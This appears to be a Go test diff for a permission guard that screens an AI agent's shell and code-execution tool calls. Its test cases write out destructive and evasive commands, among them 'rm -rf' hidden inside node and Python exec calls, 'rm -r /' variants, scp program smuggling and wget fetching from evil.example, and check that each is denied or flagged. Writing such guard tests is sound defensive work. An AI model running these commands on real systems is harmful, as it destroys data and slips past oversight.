@@ -14,6 +14,7 @@ import (
 	"encoding/json"
 	"errors"
 	"sort"
+	"strconv"
 	"sync"
 	"sync/atomic"
 	"testing"
@@ -207,6 +208,43 @@ func TestPermissionPolicyScansExecutableStdin(t *testing.T) {
 	}
 }
 
+func TestPermissionPolicyScansNodeExecFileBridge(t *testing.T) {
+	policy := DefaultPolicy()
+	policy.AllowedCommands = append(policy.AllowedCommands, "node")
+	guard := mustPermissionGuard(t, policy)
+	permission := NewPermissionPolicy(guard)
+
+	decision, err := permission.CheckToolPermission(
+		context.Background(), workspacePermissionRequest(
+			`{"command":"node -","stdin":"require('node:child_process').execFileSync('rm', ['-rf', '.'])"}`,
+		),
+	)
+
+	require.NoError(t, err)
+	require.Equal(t, tool.PermissionActionDeny, decision.Action)
+	require.Contains(t, decision.Reason, "code.process_bridge")
+}
+
+func TestPermissionPolicyReviewsGitWorktreeRestore(t *testing.T) {
+	policy := DefaultPolicy()
+	policy.AllowedCommands = append(policy.AllowedCommands, "git")
+	permission := NewPermissionPolicy(mustPermissionGuard(t, policy))
+
+	for _, command := range []string{
+		"git restore .",
+		"git checkout -- .",
+	} {
+		decision, err := permission.CheckToolPermission(
+			context.Background(), workspacePermissionRequest(
+				`{"command":`+strconv.Quote(command)+`}`,
+			),
+		)
+		require.NoError(t, err)
+		require.Equal(t, tool.PermissionActionAsk, decision.Action, command)
+		require.Contains(t, decision.Reason, "dangerous.git_restore", command)
+	}
+}
+
 func TestPermissionPolicyScansPythonCheckProcessBridges(t *testing.T) {
 	guardPolicy := DefaultPolicy()
 	guardPolicy.AllowedCommands = []string{"echo"}
@@ -260,6 +298,88 @@ func TestPermissionPolicyScansPythonCheckProcessBridges(t *testing.T) {
 			require.NoError(t, err)
 			require.Equal(t, tool.PermissionActionDeny, decision.Action)
 			require.Contains(t, decision.Reason, "code.process_bridge")
+		})
+	}
+}
+
+func TestPermissionPolicyScansPythonExecProcessBridges(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"echo"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+	execTool := codeexec.NewTool(nil)
+
+	for _, tc := range []struct {
+		name     string
+		code     string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "qualified execvp",
+			code:     `import os; os.execvp("rm", ["rm", "-rf", "."])`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "code.process_bridge",
+		},
+		{
+			name:     "imported execvp",
+			code:     `from os import execvp as launch; launch("rm", ["rm", "-rf", "."])`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "code.process_bridge",
+		},
+		{
+			name:     "static dynamic attribute",
+			code:     `import os; getattr(os, "execvp")("rm", ["rm", "-rf", "."])`,
+			want:     tool.PermissionActionDeny,
+			wantRule: "code.process_bridge",
+		},
+		{
+			name:     "ambiguous executable",
+			code:     `import os; os.execvp(program, argv)`,
+			want:     tool.PermissionActionAsk,
+			wantRule: "code.process_bridge",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]any{
+				"code_blocks": []map[string]string{{
+					"language": "python",
+					"code":     tc.code,
+				}},
+			})
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				&tool.PermissionRequest{
+					Tool: execTool, ToolName: "execute_code", Arguments: arguments,
+				},
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			require.Contains(t, decision.Reason, tc.wantRule)
+		})
+	}
+}
+
+func TestPermissionPolicyRejectsRecursiveRootDeleteWithoutForce(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"rm"}
+	guardPolicy.DeniedPaths = nil
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, command := range []string{
+		"rm -r /",
+		"rm --recursive --no-preserve-root /",
+		"rm / -r --no-preserve-root",
+		"rm -r -- /",
+	} {
+		t.Run(command, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]string{"command": command})
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tool.PermissionActionDeny, decision.Action)
+			require.Contains(t, decision.Reason, "dangerous.rm_rf")
 		})
 	}
 }
@@ -405,6 +525,80 @@ func TestPermissionPolicyScansSSHRemoteCommands(t *testing.T) {
 				"command": tc.command,
 			})
 			require.NoError(t, err)
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
+func TestPermissionPolicyReviewsScpLocalProgramSelectors(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"scp", "scp.exe", "echo"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "local connection program",
+			command:  "scp -S echo README.md api.github.com:/tmp/x",
+			want:     tool.PermissionActionAsk,
+			wantRule: "command.indirect_execution",
+		},
+		{
+			name:     "local sftp server",
+			command:  "scp -D echo README.md api.github.com:/tmp/x",
+			want:     tool.PermissionActionAsk,
+			wantRule: "command.indirect_execution",
+		},
+		{
+			name:     "Windows connection program",
+			command:  "scp -S ./runner.exe README.md api.github.com:/tmp/x",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.command",
+		},
+		{
+			name:     "grouped connection program",
+			command:  "scp -TS echo README.md api.github.com:/tmp/x",
+			want:     tool.PermissionActionAsk,
+			wantRule: "command.indirect_execution",
+		},
+		{
+			name:     "Windows sftp server",
+			command:  "scp -D ./server.exe README.md api.github.com:/tmp/x",
+			want:     tool.PermissionActionDeny,
+			wantRule: "dangerous.command",
+		},
+		{
+			name:     "Windows scp connection program",
+			command:  "scp.exe -S echo README.md api.github.com:/tmp/x",
+			want:     tool.PermissionActionAsk,
+			wantRule: "command.indirect_execution",
+		},
+		{
+			name:    "Windows scp without selector",
+			command: "scp.exe README.md api.github.com:/tmp/x",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "no local selector",
+			command: "scp README.md api.github.com:/tmp/x",
+			want:    tool.PermissionActionAllow,
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]string{"command": tc.command})
 			decision, err := policy.CheckToolPermission(
 				context.Background(),
 				workspacePermissionRequest(string(arguments)),
@@ -2019,6 +2213,166 @@ func TestPermissionPolicyClassifiesRsyncDelete(t *testing.T) {
 			if tc.wantRule != "" {
 				require.Contains(t, decision.Reason, tc.wantRule)
 			}
+		})
+	}
+}
+
+func TestPermissionPolicyClassifiesRsyncSourceRemoval(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"rsync"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "local transfer",
+			command:  "rsync --remove-source-files src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "remote transfer",
+			command:  "rsync --remove-source-files src/ api.github.com:/dst",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "attached remote source removal",
+			command:  "rsync -M--remove-source-files src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "separate remote source removal",
+			command:  "rsync -M --remove-source-files src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "direct removal is not disabled remotely",
+			command:  "rsync --remove-source-files -M--no-remove-source-files src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "remote removal is not disabled locally",
+			command:  "rsync --no-remove-source-files -M--remove-source-files src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:    "dry run",
+			command: "rsync --dry-run --remove-source-files src/ out/",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:    "disabled",
+			command: "rsync --remove-source-files --no-remove-source-files src/ out/",
+			want:    tool.PermissionActionAllow,
+		},
+		{
+			name:     "re-enabled",
+			command:  "rsync --no-remove-source-files --remove-source-files src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+		{
+			name:     "abbreviated removal",
+			command:  "rsync --remove-source src/ out/",
+			want:     tool.PermissionActionAsk,
+			wantRule: "dangerous.rsync_delete",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]string{"command": tc.command})
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			if tc.wantRule != "" {
+				require.Contains(t, decision.Reason, tc.wantRule)
+			}
+		})
+	}
+}
+
+func TestPermissionPolicyReviewsWgetInputFiles(t *testing.T) {
+	guardPolicy := DefaultPolicy()
+	guardPolicy.AllowedCommands = []string{"wget", "wget.exe"}
+	guardPolicy.NetworkAllowlist = []string{"github.com"}
+	policy := NewPermissionPolicy(mustPermissionGuard(t, guardPolicy))
+
+	for _, tc := range []struct {
+		name     string
+		command  string
+		want     tool.PermissionAction
+		wantRule string
+	}{
+		{
+			name:     "external URL",
+			command:  "wget -i https://evil.example/urls",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "attached external URL",
+			command:  "wget -ihttps://evil.example/urls",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "Windows external URL",
+			command:  "wget.exe -i https://evil.example/urls",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "long external URL",
+			command:  "wget --input-file https://evil.example/urls",
+			want:     tool.PermissionActionDeny,
+			wantRule: "network.destination",
+		},
+		{
+			name:     "local input",
+			command:  "wget --input-file=urls.txt",
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.input_file",
+		},
+		{
+			name:     "stdin input",
+			command:  "wget -i -",
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.input_file",
+		},
+		{
+			name:     "attached stdin input",
+			command:  "wget -i-",
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.input_file",
+		},
+		{
+			name:     "allowlisted URL input",
+			command:  "wget -i https://api.github.com/urls",
+			want:     tool.PermissionActionAsk,
+			wantRule: "network.input_file",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			arguments := mustJSON(t, map[string]string{"command": tc.command})
+			decision, err := policy.CheckToolPermission(
+				context.Background(),
+				workspacePermissionRequest(string(arguments)),
+			)
+			require.NoError(t, err)
+			require.Equal(t, tc.want, decision.Action)
+			require.Contains(t, decision.Reason, tc.wantRule)
 		})
 	}
 }
